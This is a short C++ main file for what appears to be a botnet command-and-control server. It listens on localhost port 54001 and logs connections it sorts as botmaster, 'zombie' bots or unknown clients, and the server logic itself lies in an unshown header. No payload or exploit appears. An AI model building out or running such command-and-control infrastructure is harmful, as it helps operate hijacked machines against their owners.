#include <iostream>

#include "Server.h"

int main()
{
	std::cout << "Init CanC" << std::endl;
	Server CandC("127.0.0.1", 54001);

	if (!CandC.init())
		return 0;

	if (CandC.createListeningSocket())
	{
		while (true)
		{
			switch (CandC.waitForConnection())
			{
			case WEIRDO:
				std::cout << "Weido tried to connect" << std::endl;
				break;
			case BOTMASTER: 
				std::cout << "Botmaster connected" << std::endl;
				break;
			case ZOMBIE:
				std::cout << "New Zombie" << std::endl;
				break;
			}
		}
	}
	else
	{
		std::cout << "couldnt create server socket" << std::endl;
	}

	std::cin.get();
	return 0;
}